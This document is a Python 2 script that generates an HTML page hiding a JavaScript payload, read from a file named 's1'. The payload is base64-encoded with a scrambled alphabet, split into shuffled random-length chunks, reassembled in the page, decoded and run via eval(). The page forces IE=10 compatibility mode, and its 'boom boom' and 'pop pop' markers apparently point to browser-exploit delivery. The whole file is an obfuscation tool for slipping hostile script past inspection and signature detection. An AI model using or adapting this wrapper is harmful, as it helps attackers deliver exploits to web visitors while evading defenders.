import base64
import string
import random
def encode(s):
	return base64.b64encode(s).translate(
		string.maketrans(
			string.uppercase+string.lowercase+string.digits+"+/",
			string.digits+string.uppercase+string.lowercase+"+/"
		)
	)

def chunk(s):
	c=[]
	i=0
	while(i<len(s)):
		j=random.choice(range(5,20))
		c.append(s[i:i+j])
		i+=j
	return c

print '''<html><head>
<meta http-equiv="X-UA-Compatible" content="IE=10">
<meta charset="UTF-8">
</head>
<body><hl>boom boom</hl><script>'''
with open('s1') as f:
	s = f.read()
b=encode(s[:-1])
c=chunk(b)
m=range(0,len(c))
r=list(zip(m,c))
random.shuffle(r)
d='x=['
for i in r:
	d+='"'+i[1]+'",'
print d[:-1]+'];'
d='z='
for i in sorted(r):
	d+='x['+str(r.index(i))+']+'
print d[:-1]+';'
print '''k="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/=";
function g(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=k.indexOf(e.charAt(f++));o=k.indexOf(e.charAt(f++));u=k.indexOf(e.charAt(f++));a=k.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return t;}
eval(g(z));
</script>
<h5>pop pop</h5></body></html>'''
